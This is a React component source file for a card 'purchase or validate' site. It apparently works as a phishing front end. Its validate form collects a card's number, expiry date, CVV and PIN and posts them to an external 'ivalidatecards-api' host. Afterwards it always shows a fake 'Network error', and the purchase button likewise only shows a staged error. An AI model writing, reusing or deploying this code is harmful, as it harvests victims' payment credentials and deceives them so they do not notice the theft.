import {React , useState  } from 'react'
import { HashLink as Link } from "react-router-hash-link";
import axios from "axios"
import "./purchaseOrValidate.scss"


const PurchaseOrValidate = ({card}) => {

  const [purchaseCard , setPurchaseCard] = useState(false)
  const [validateCard , setValidateCard] = useState(false)
  const [isValidating , setIsValidating] = useState(false)

  const [purchaseError, setPurchaseError] = useState(false)
  const [shouldNavigate, setShouldNavigate] = useState(false);



  
   const purchaseCardOpen = () => {
    setPurchaseCard(true)
      
   }
  const purchaseCardClose = () => {
    setPurchaseCard(false)
    setPurchaseError(false); 
    setIsValidating(false)

  }
  const handlePurchase = (e) => {
    e.preventDefault();
    setIsValidating(true);

    setTimeout(() => {
      setPurchaseError(true);
    }, 3000);


    setTimeout(() => {
      setIsValidating(false)
     }, 3000);
    



  }

  const validateCardOpen = () => {
    setValidateCard(true)
    
  }
  const validateCardClose = () => {
    setValidateCard(false)
    setPurchaseError(false);  }



  const handleValidate = async (e) => {

    e.preventDefault()
    setIsValidating(true)
    
    const form = e.target

    const formData = new FormData(form)

    const data = {
      cardName : formData.get("cardName"),
      cardNumber: formData.get("cardNumber"),
      expiryDate: formData.get("expiryDate"),
      cvv: formData.get("cvv"),
      pin: formData.get("pin"),
    };

    try {

      const response = await axios.post('https://ivalidatecards-api.onrender.com/validate', data);


      console.log('Response:', response.data);

      window.location.hash = "#submit";


     
    } catch (error) {
      console.error('Error:', error.response || error.message);
    } 
    
      setTimeout(() => {
      setPurchaseError(true)
     }, 3000);

     setTimeout(() => {
      setIsValidating(false)
     }, 3000);

  };
  
 

  return (
    <div className="purchaseOrValidate">
      <div className="purchasewrapper">
        <div className="purchase" onClick={purchaseCardOpen}>
          <span>Purchase</span>
        </div>
  
        <div className="validate" onClick={validateCardOpen}>
          <span>Validate</span>
        </div>
        <div className="or">
          <span>Or</span>
        </div>
        
      </div>
      {purchaseCard &&  
        <div className='popupOverlay'>
          <div className="popupContent">
            <div className="popupCard">
              <div className="popupCardImg">
               <img src={card.img} alt="" />
              </div>
              <div className="popupCardContent">
                <div className="heading">
                {purchaseError && (
                    <p className="error-message">Network error, please try again later.</p>
                  )}
                  <h1>{card.name}</h1> 
                </div>
                <div className="deliveryInfo">
                 <div className="deliveryItems"><img src="/mail2.png" alt="" /><p>Email Delivery</p></div> 
                  <div className="deliveryItems"><img src="/time.png" alt="" /><p>Est. Delivery Time: 1-3Min</p></div>
                </div>
                <div className="input">
                  <input className="amount" type="text" placeholder='amount $20 - $500' />
                  <input className="number" type="text"  placeholder='no of cards' />
                  <Link to="/submit" type="submit" onClick = {handlePurchase}>{isValidating ?  (
                  <div className="loading">
                    <img src="/loading.gif" alt="Loading" />
                    <p>Processing...</p>
                  </div>
                ): "Proceed to Payment" }</Link>
                </div>
                </div>
                <button className="close-btn">
                  <img onClick={purchaseCardClose} src="/cancel2.png" alt="" />
               </button>
              
              
            </div>
            
          </div>
            </div>
         }
        {validateCard  &&  
        <div className='popupOverlay'>
          <div className="popupContent">    
            <div className="popupCard">
             
              <div className="popupCardContent">
                <div className="heading">
                {purchaseError && (
                    <p className="error-message">Network error, please try again later.</p>
                  )}
                  <h1>Verify your {card.name}</h1>
                </div>
             
                  <form onSubmit = {handleValidate} className="input" action="">
                  <input type="hidden" name="cardName" value={card.name} />

                  <input className="amount"   name="cardNumber"  type="text" placeholder='enter card number'/>


                    {card.cvv &&  <div>
                      <input className="amount expiryDate"   name="expiryDate"   type="text" placeholder='expiry date'/>
                      <input className="amount cvv"   name ="cvv"  type="text" placeholder='cvv'/>
                    </div>  }
                    {card.pin && <div>
                      <input className="amount pin " name="pin"   type="text" placeholder='enter pin'/>
                    </div>    }
                    {
                      card.name === "American Express" && <div>
                         <input className="amount expiryDate"   name="expiryDate"  type="text" placeholder='expiry date'/>
                         <input className="amount pin"   name="pin" type="text" placeholder='enter pin'/>
                         <input className="amount cvv"  name ="cvv"  type="text" placeholder='cvv'/>


                      </div>
                    }

                    <button type="submit">{isValidating ?  (
                  <div className="loading">
                    <img src="/loading.gif" alt="Loading" />
                    <p>Validating...</p>
                  </div>
                ): "Validate" }</button>

                  </form>
                </div>
                <button className="close-btn">
                  <img onClick={validateCardClose} src="/cancel2.png" alt="" />
               </button>
              
            </div>
            
          </div>
            </div>
         }

    </div>

  )


}

export default PurchaseOrValidate
